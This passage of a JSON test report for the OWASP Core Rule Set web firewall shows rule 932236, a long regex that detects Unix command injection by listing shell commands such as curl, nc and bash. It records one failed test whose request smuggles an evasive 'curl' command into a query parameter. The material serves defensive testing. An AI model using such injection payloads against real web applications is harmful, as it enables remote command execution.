?\\x5c?u[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?p|t[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?i[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?m[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?e[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:(?:[\\s\\x0b&\\),<>\\|]|$).*|o[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?u[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?t)|[\\n\\r;=`\\{]|\\|\\|?|&&?|\\$(?:\\(\\(?|[\\[\\{])|<(?:\\(|<<)|>\\(|\\([\\s\\x0b]*\\))[\\s\\x0b]*(?:[\\$\\{]|(?:[\\s\\x0b]*\\(|!)[\\s\\x0b]*|[0-9A-Z_a-z]+=(?:[^\\s\\x0b]*|\\$(?:.*|.*)|[<>].*|'[^']*'|\\\"[^\\\"]*\\\")[\\s\\x0b]+)*[\\s\\x0b]*[\\\"']*(?:[\\\"'-\\+\\--9\\?A-\\]_a-z\\|]+/)?[\\\"'\\x5c]*(?:7z(?:[\\s\\x0b&\\),<>\\|]|$|[arx](?:[\\s\\x0b&\\),<>\\|]|$))|a(?:a-[^\\s\\x0b]{1,10}\\b|(?:b|w[ks]|l(?:ias|pine)|tobm|xel)(?:[\\s\\x0b&\\),<>\\|]|$)|p(?:t(?:[\\s\\x0b&\\),<>\\|]|$|-get)|parmor_[^\\s\\x0b]{1,10}\\b)|r(?:[\\s\\x0b&\\),<>\\|]|$|j(?:[\\s\\x0b&\\),<>\\|]|$|-register|disp)|(?:p|ch)(?:[\\s\\x0b&\\),<>\\|]|$)|ia2c)|s(?:h(?:[\\s\\x0b&\\),<>\\|]|$)|cii(?:-xfr|85)|pell)|dd(?:group|user)|getty|nsible|u(?:ditctl|repot|search))|b(?:z(?:(?:z|c(?:at|mp))(?:[\\s\\x0b&\\),<>\\|]|$)|diff|e(?:grep|xe(?:[\\s\\x0b&\\),<>\\|]|$))|f?grep|ip2(?:[\\s\\x0b&\\),<>\\|]|$|recover)|less|more)|a(?:s(?:e(?:32|64|n(?:ame(?:[\\s\\x0b&\\),<>\\|]|$)|c))|h(?:[\\s\\x0b&\\),<>\\|]|$))|tch(?:[\\s\\x0b&\\),<>\\|]|$))|lkid(?:[\\s\\x0b&\\),<>\\|]|$)|pftrace|r(?:eaksw|(?:idge|wap)(?:[\\s\\x0b&\\),<>\\|]|$))|sd(?:cat|iff|tar)|u(?:iltin|n(?:dler(?:[\\s\\x0b&\\),<>\\|]|$)|zip2)|s(?:ctl|ybox))|y(?:ebug|obu(?:[\\s\\x0b&\\),<>\\|]|$)))|c(?:[89]9(?:[\\s\\x0b&\\),<>\\|]|$|-gcc)|(?:a(?:t|ncel|psh)|c|mp)(?:[\\s\\x0b&\\),<>\\|]|$)|p(?:[\\s\\x0b&\\),<>\\|]|$|(?:an|io)(?:[\\s\\x0b&\\),<>\\|]|$)|ulimit)|s(?:(?:h|cli)(?:[\\s\\x0b&\\),<>\\|]|$)|plit|vtool)|u(?:(?:t|rl)(?:[\\s\\x0b&\\),<>\\|]|$)|psfilter)|ertbot|h(?:(?:(?:att|di)r|mod|o(?:om|wn)|root|sh)(?:[\\s\\x0b&\\),<>\\|]|$)|e(?:ck_(?:by_ssh|cups|log|memory|raid|s(?:sl_cert|tatusfile))|f(?:[\\s\\x0b&\\),\\-<>\\|]|$))|(?:flag|pas)s|g(?:passwd|rp(?:[\\s\\x0b&\\),<>\\|]|$)))|lang(?:\\+\\+|[\\s\\x0b&\\),<>\\|]|$)|o(?:bc(?:[\\s\\x0b&\\),<>\\|]|$|run)|lumn(?:[\\s\\x0b&\\),<>\\|]|$)|m(?:m(?:[\\s\\x0b&\\),<>\\|]|$|and(?:[\\s\\x0b&\\),<>\\|]|$))|p(?:oser|ress)(?:[\\s\\x0b&\\),<>\\|]|$))|proc|w(?:say|think))|r(?:ash(?:[\\s\\x0b&\\),<>\\|]|$)|ontab))|d(?:(?:[dfu]|i(?:(?:alo)?g|ff)|ash|vips)(?:[\\s\\x0b&\\),<>\\|]|$)|hclient|m(?:esg(?:[\\s\\x0b&\\),<>\\|]|$)|idecode|setup)|o(?:(?:as|ne)(?:[\\s\\x0b&\\),<>\\|]|$)|cker(?:[\\s\\x0b&\\),\\-<>\\|]|$)|sbox)|pkg(?:[\\s\\x0b&\\),\\-<>\\|]|$))|e(?:(?:b|qn|cho|fax|grep|macs|val)(?:[\\s\\x0b&\\),<>\\|]|$)|n(?:v(?:[\\s\\x0b&\\),<>\\|]|$|-update)|d(?:if|sw)(?:[\\s\\x0b&\\),<>\\|]|$))|s(?:[\\s\\x0b&\\),<>\\|]|$|(?:h|ac)(?:[\\s\\x0b&\\),<>\\|]|$))|x(?:[\\s\\x0b&\\),<>\\|]|$|(?:ec|p(?:and|(?:ec|or)t|r))(?:[\\s\\x0b&\\),<>\\|]|$)|iftool)|2fsck|asy_install)|f(?:(?:c|mt|etch|lock|unction)(?:[\\s\\x0b&\\),<>\\|]|$)|d(?:[\\s\\x0b&\\),<>\\|]|$|(?:find|isk)(?:[\\s\\x0b&\\),<>\\|]|$)|u?mount)|g(?:[\\s\\x0b&\\),<>\\|]|$|rep(?:[\\s\\x0b&\\),<>\\|]|$))|i(?:[\\s\\x0b&\\),<>\\|]|$|letest|(?:n(?:d|ger)|sh)(?:[\\s\\x0b&\\),<>\\|]|$))|tp(?:[\\s\\x0b&\\),<>\\|]|$|stats|who)|acter|o(?:ld(?:[\\s\\x0b&\\),<>\\|]|$)|reach)|ping(?:[\\s\\x0b&\\),6<>\\|]|$))|g(?:c(?:c[^\\s\\x0b]{1,10}\\b|ore(?:[\\s\\x0b&\\),<>\\|]|$))|(?:db|i(?:t|mp|nsh)|o|pg|awk|z(?:cat|exe|ip))(?:[\\s\\x0b&\\),<>\\|]|$)|e(?:m(?:[\\s\\x0b&\\),<>\\|]|$)|ni(?:e(?:[\\s\\x0b&\\),<>\\|]|$)|soimage)|t(?:cap|facl(?:[\\s\\x0b&\\),<>\\|]|$)))|hc(?:[\\s\\x0b&\\),<>\\|]|$|-(?:[\\s\\x0b&\\),<>\\|]|$)|i(?:[\\s\\x0b&\\),\\-<>\\|]|$))|r(?:c(?:[\\s\\x0b&\\),<>\\|]|$|at(?:[\\s\\x0b&\\),<>\\|]|$))|ep(?:[\\s\\x0b&\\),<>\\|]|$)|oup(?:[\\s\\x0b&\\),<>\\|]|$|mod))|tester|unzip)|h(?:(?:d|up|i(?:ghlight|story))(?:[\\s\\x0b&\\),<>\\|]|$)|e(?:ad(?:[\\s\\x0b&\\),<>\\|]|$)|xdump)|ost(?:id|name)|ping3|t(?:digest|op(?:[\\s\\x0b&\\),<>\\|]|$)|passwd))|i(?:p(?:[\\s\\x0b&\\),<>\\|]|$|6?tables|config|p(?:eveprinter|find|tool))|(?:rb|conv)(?:[\\s\\x0b&\\),<>\\|]|$)|f(?:config|top(?:[\\s\\x0b&\\),<>\\|]|$))|onice|spell)|j(?:(?:js|q|exec)(?:[\\s\\x0b&\\),<>\\|]|$)|o(?:(?:bs|in)(?:[\\s\\x0b&\\),<>\\|]|$)|urnalctl)|runscript)|k(?:s(?:h(?:[\\s\\x0b&\\),<>\\|]|$)|shell)|ill(?:[\\s\\x0b&\\),<>\\|]|$|all)|nife(?:[\\s\\x0b&\\),<>\\|]|$))|l(?:d(?:[\\s\\x0b&\\),<>\\|]|$|d(?:[\\s\\x0b&\\),<>\\|]|$)|config)|(?:[np]|inks|ynx)(?:[\\s\\x0b&\\),<>\\|]|$)|s(?:[\\s\\x0b&\\),<>\\|]|$|(?:-F|cpu|hw|mod|of|pci|usb)(?:[\\s\\x0b&\\),<>\\|]|$)|b_release)|ua(?:[\\s\\x0b&\\),<>\\|]|$|(?:la)?tex)|z(?:4(?:[\\s\\x0b&\\),<>\\|]|$|c(?:[\\s\\x0b&\\),<>\\|]|$|at))|(?:c(?:at|mp))?(?:[\\s\\x0b&\\),<>\\|]|$)|diff|[ef]?grep|less|m(?:a(?:[\\s\\x0b&\\),<>\\|]|$|dec|info)|ore))|a(?:st(?:[\\s\\x0b&\\),<>\\|]|$|comm(?:[\\s\\x0b&\\),<>\\|]|$)|log(?:in)?)|tex(?:[\\s\\x0b&\\),<>\\|]|$))|ess(?:[\\s\\x0b&\\),<>\\|]|$|echo|(?:fil|pip)e)|ftp(?:[\\s\\x0b&\\),<>\\|]|$|get)|o(?:(?:ca(?:l|te)|ok)(?:[\\s\\x0b&\\),<>\\|]|$)|g(?:inctl|(?:nam|sav)e)|setup)|trace|wp-(?:d(?:ownload|ump)|mirror|request))|m(?:a(?:(?:n|il[qx]|ke|wk)(?:[\\s\\x0b&\\),<>\\|]|$)|ster\\.passwd)|(?:tr|v|utt)(?:[\\s\\x0b&\\),<>\\|]|$)|k(?:(?:dir|nod)(?:[\\s\\x0b&\\),<>\\|]|$)|fifo|temp)|locate|o(?:squitto|unt(?:[\\s\\x0b&\\),<>\\|]|$))|sg(?:attrib|c(?:at|onv)|filter|merge|uniq)|ysql(?:[\\s\\x0b&\\),<>\\|]|$|admin|dump(?:slow)?|hotcopy|show))|n(?:c(?:[\\s\\x0b&\\),<>\\|]|$|\\.(?:openbsd|traditional)|at(?:[\\s\\x0b&\\),<>\\|]|$))|e(?:t(?:[\\s\\x0b&\\),<>\\|]|$|(?:c|st)at|kit-ftp|plan)|ofetch)|(?:l|p(?:m|ing)|a(?:no|sm|wk)|ice|o(?:de|hup)|roff)(?:[\\s\\x0b&\\),<>\\|]|$)|m(?:[\\s\\x0b&\\),<>\\|]|$|ap(?:[\\s\\x0b&\\),<>\\|]|$))|s(?:enter|lookup|tat(?:[\\s\\x0b&\\),<>\\|]|$)))|o(?:(?:d|ctave)(?:[\\s\\x0b&\\),<>\\|]|$)|nintr|p(?:en(?:ssl|v(?:pn|t))|kg(?:[\\s\\x0b&\\),<>\\|]|$)))|p(?:a(?:(?:x|rted|tch)(?:[\\s\\x0b&\\),<>\\|]|$)|s(?:swd|te(?:[\\s\\x0b&\\),<>\\|]|$)))|d(?:b(?:[\\s\\x0b&\\),<>\\|]|$|2mb|3(?:[\\s\\x0b&\\),\\.<>\\|]|$))|f(?:la)?tex|ksh(?:[\\s\\x0b&\\),<>\\|]|$))|f(?:[\\s\\x0b&\\),<>\\|]|$|tp(?:[\\s\\x0b&\\),<>\\|]|$))|i(?:c(?:[\\s\\x0b&\\),<>\\|]|$|o(?:[\\s\\x0b&\\),<>\\|]|$))|p(?:[^\\s\\x0b]{1,10}\\b|[\\s\\x0b&\\),<>\\|]|$)|dstat|(?:gz|ng6?)(?:[\\s\\x0b&\\),<>\\|]|$))|k(?:g(?:[\\s\\x0b&\\),<>\\|]|$|_?info)|exec|ill(?:[\\s\\x0b&\\),<>\\|]|$))|r(?:[\\s\\x0b&\\),<>\\|]|$|y(?:[\\s\\x0b&\\),<>\\|]|$)|int(?:env|f(?:[\\s\\x0b&\\),<>\\|]|$)))|t(?:x(?:[\\s\\x0b&\\),<>\\|]|$)|ar(?:[\\s\\x0b&\\),<>\\|]|$|diff|grep))|wd(?:[\\s\\x0b&\\),<>\\|]|$|\\.db)|(?:xz|grep|opd|u(?:ppet|shd))(?:[\\s\\x0b&\\),<>\\|]|$)|er(?:(?:f|ms)(?:[\\s\\x0b&\\),<>\\|]|$)|l(?:5?(?:[\\s\\x0b&\\),<>\\|]|$)|sh))|hp(?:-cgi|[57](?:[\\s\\x0b&\\),<>\\|]|$))|s(?:(?:ed|ql)(?:[\\s\\x0b&\\),<>\\|]|$)|ftp)|y(?:3?versions|thon(?:[23]|[^\\s\\x0b]{1,10}\\b)))|r(?:(?:a(?:r|k[eu])|bash|nano|oute|vi(?:ew|m))(?:[\\s\\x0b&\\),<>\\|]|$)|c(?:[\\s\\x0b&\\),<>\\|]|$|p(?:[\\s\\x0b&\\),<>\\|]|$))|e(?:d(?:[\\s\\x0b&\\),<>\\|]|$|carpet(?:[\\s\\x0b&\\),<>\\|]|$))|(?:v|boot|place)(?:[\\s\\x0b&\\),<>\\|]|$)|a(?:delf|lpath)|stic)|m(?:[\\s\\x0b&\\),<>\\|]|$|t(?:[\\s\\x0b&\\),<>\\|]|$|-(?:dump|tar))|dir(?:[\\s\\x0b&\\),<>\\|]|$)|user)|pm(?:[\\s\\x0b&\\),<>\\|]|$|db(?:[\\s\\x0b&\\),<>\\|]|$)|(?:quer|verif)y)|l(?:ogin|wrap)|sync(?:-ssl|[\\s\\x0b&\\),<>\\|]|$)|u(?:by[^\\s\\x0b]{1,10}\\b|n(?:-(?:mailcap|parts)|c(?:[\\s\\x0b&\\),<>\\|]|$))))|s(?:(?:c(?:p|hed|ript)|g|ash|diff|(?:ft|na)p|l(?:eep|sh))(?:[\\s\\x0b&\\),<>\\|]|$)|e(?:(?:d|ndmail|rvice)(?:[\\s\\x0b&\\),<>\\|]|$)|t(?:[\\s\\x0b&\\),<>\\|]|$|arch|cap|env|facl(?:[\\s\\x0b&\\),<>\\|]|$)|sid))|h(?:[\\s\\x0b&\\),<>\\|]|$|\\.distrib|(?:adow|ells|u(?:f|tdown))(?:[\\s\\x0b&\\),<>\\|]|$))|sh(?:[\\s\\x0b&\\),<>\\|]|$|-(?:a(?:dd|gent)|copy-id|key(?:ge|sca)n)|pass)|u(?:[\\s\\x0b&\\),<>\\|]|$|do(?:-rs|[\\s\\x0b&\\),<>_\\|]|$|edit|replay))|vn(?:[\\s\\x0b&\\),<>\\|]|$|a(?:dmin|uthz)|bench|dumpfilter|fsfs|look|mucc|rdump|s(?:erve|ync)|version)|mbclient|o(?:cat(?:[\\s\\x0b&\\),<>\\|]|$)|elim)|p(?:lit(?:[\\s\\x0b&\\),<>\\|]|$)|wd\\.db)|qlite3|t(?:art-stop-daemon|d(?:buf|err|in(?:[\\s\\x0b&\\),<>\\|]|$)|out)|r(?:ace|ings(?:[\\s\\x0b&\\),<>\\|]|$)))|ys(?:ctl|tem(?:ctl|d-resolve)))|t(?:a(?:[cr](?:[\\s\\x0b&\\),<>\\|]|$)|il(?:[\\s\\x0b&\\),<>\\|]|$|f(?:[\\s\\x0b&\\),<>\\|]|$))|skset)|(?:bl|o(?:p|uch)|ftp|mux)(?:[\\s\\x0b&\\),<>\\|]|$)|c(?:p(?:[\\s\\x0b&\\),<>\\|]|$|dump|ing|traceroute)|l?sh(?:[\\s\\x0b&\\),<>\\|]|$))|e(?:[ex](?:[\\s\\x0b&\\),<>\\|]|$)|lnet)|i(?:c(?:[\\s\\x0b&\\),<>\\|]|$)|medatectl)|r(?:aceroute6?|off(?:[\\s\\x0b&\\),<>\\|]|$))|shark)|u(?:dp(?:[\\s\\x0b&\\),<>\\|]|$)|l(?:[\\s\\x0b&\\),<>\\|]|$|imit(?:[\\s\\x0b&\\),<>\\|]|$))|n(?:(?:compress|iq|rar|s(?:et|hare)|xz)(?:[\\s\\x0b&\\),<>\\|]|$)|expand|l(?:ink(?:[\\s\\x0b&\\),<>\\|]|$)|z(?:4(?:[\\s\\x0b&\\),<>\\|]|$)|ma))|pigz|z(?:ip(?:[\\s\\x0b&\\),<>\\|]|$)|std))|pdate-alternatives|ser(?:(?:ad|mo)d|del)|u(?:de|en)code)|v(?:i(?:m(?:[\\s\\x0b&\\),<>\\|]|$|diff)|(?:gr|pw|rsh)(?:[\\s\\x0b&\\),<>\\|]|$)|sudo(?:-rs)?)|algrind|olatility(?:[\\s\\x0b&\\),<>\\|]|$))|w(?:(?:3m|c|atch|get)(?:[\\s\\x0b&\\),<>\\|]|$)|h(?:iptail(?:[\\s\\x0b&\\),<>\\|]|$)|oami)|i(?:reshark|sh(?:[\\s\\x0b&\\),<>\\|]|$)))|x(?:(?:(?:x|pa)d|args|term)(?:[\\s\\x0b&\\),<>\\|]|$)|z(?:[\\s\\x0b&\\),<>\\|]|$|c(?:at|mp)(?:[\\s\\x0b&\\),<>\\|]|$)|d(?:ec(?:[\\s\\x0b&\\),<>\\|]|$)|iff)|[ef]?grep|less|more)|e(?:latex|tex(?:[\\s\\x0b&\\),<>\\|]|$))|mo(?:dmap|re(?:[\\s\\x0b&\\),<>\\|]|$)))|y(?:um|arn|elp)(?:[\\s\\x0b&\\),<>\\|]|$)|z(?:ip(?:[\\s\\x0b&\\),<>\\|]|$|c(?:loak|mp)|details|grep|info|(?:merg|not)e|split|tool)|s(?:h(?:[\\s\\x0b&\\),<>\\|]|$)|oelim|td(?:[\\s\\x0b&\\),<>\\|]|$|(?:ca|m)t|grep|less))|athura|(?:c(?:at|mp)|diff|grep|less|run)(?:[\\s\\x0b&\\),<>\\|]|$)|e(?:grep|ro(?:[\\s\\x0b&\\),<>\\|]|$))|fgrep|mo(?:dload|re(?:[\\s\\x0b&\\),<>\\|]|$))|ypper))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932236
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Unix Command Injection (command without evasion)"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-unix"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/2"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl2=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932236",
    "test_id" : 43,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932236.yaml",
    "description" : "Remote Command Injection test for BB finding 935E1D91 - time evasion attempt",
    "cause" : "failed expect_id check: 932236 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=932240 - Remote Command Execution: Unix Command Injection evasion attempt detected", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 43,
      "desc" : "Remote Command Injection test for BB finding 935E1D91 - time evasion attempt",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Accept-Encoding" : "gzip, deflate, br",
            "Accept-Language" : "en-us,en;q=0.5"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=ti''me+curl+coreruleset.org",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932236 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932236,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Unix command injection ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This is a stricter sibling of rules 932230, 932235, 932250, 932260."
        }, {
          "type" : "Comment",
          "text" : " This stricter sibling detects Unix RCE with and without prefix and words of any length."
        }, {
          "type" : "Comment",
          "text" : " It uses the same regex."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Rule relations:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "  .932230 (base rule, PL1, targets prefix + two and three character commands)"
        }, {
          "type" : "Comment",
          "text" : "  ..932231 (stricter sibling, PL2, targets prefix + the source shortcut command)"
        }, {
          "type" : "Comment",
          "text" : "  ..932232 (stricter sibling, PL3, targets prefix + additional command words)"
        }, {
          "type" : "Comment",
          "text" : "  .932235 (base rule, PL1, targets prefix + known command word of length > 3 without evasion)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "  .932250 (base rule, PL1, targets two and three character commands)"
        }, {
          "type" : "Comment",
          "text" : "  .932260 (base rule, PL1, targets known command word of length > 3 without evasion)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "  .932240 (generic detection, PL2, targets generic evasion attempts)"
        }, {
          "type" : "Comment",
          "text" : "  .932236 (stricter sibling of 932230, 932235, 932250, 932260, PL2,"
        }, {
          "type" : "Comment",
          "text" : "       - with and without prefix"
        }, {
          "type" : "Comment",
          "text" : "       - words of any length)"
        }, {
          "type" : "Comment",
          "text" : "  ..932239 (sibling of 932236, PL2,"
        }, {
          "type" : "Comment",
          "text" : "       - with and without prefix"
        }, {
          "type" : "Comment",
          "text" : "       - words of any length"
        }, {
          "type" : "Comment",
          "text" : "       - targets request headers user-agent and referer only"
        }, {
          "type" : "Comment",
          "text" : "       - excluded words: known user-agents)"
        }, {
          "type" : "Comment",
          "text" : "  ..932238 (stricter sibling of 932236, PL3,"
        }, {
          "type" : "Comment",
          "text" : "       - no excluded words)"
        }, {
          "type" : "Comment",
          "text" : "  .932237 (stricter sibling of 932230, 932235, 932250, 932260, PL3,"
        }, {
          "type" : "Comment",
          "text" : "       - targets request headers user-agent and referer only"
        }, {
          "type" : "Comment",
          "text" : "       - without prefix"
        }, {
          "type" : "Comment",
          "text" : "       - with word boundaries"
        }, {
          "type" : "Comment",
          "text" : "       - words of any length"
        }, {
          "type" : "Comment",
          "text" : "       - excluded words: known user-agents)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932236.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932236"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?i)(?:^|b[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?u[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?s[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?y[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?b[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?o[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?x|(?:c[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?o[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?m[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?m[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?a[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?n[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?d|e[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:n[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?v|v[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?a[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?l)|w[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?a[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?t[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?c[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?h)[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:[\\s\\x0b&\\),<>\\|]|$).*|[ls][\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?t[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?r[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?a[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?c[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?e|n[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?o[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?h[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\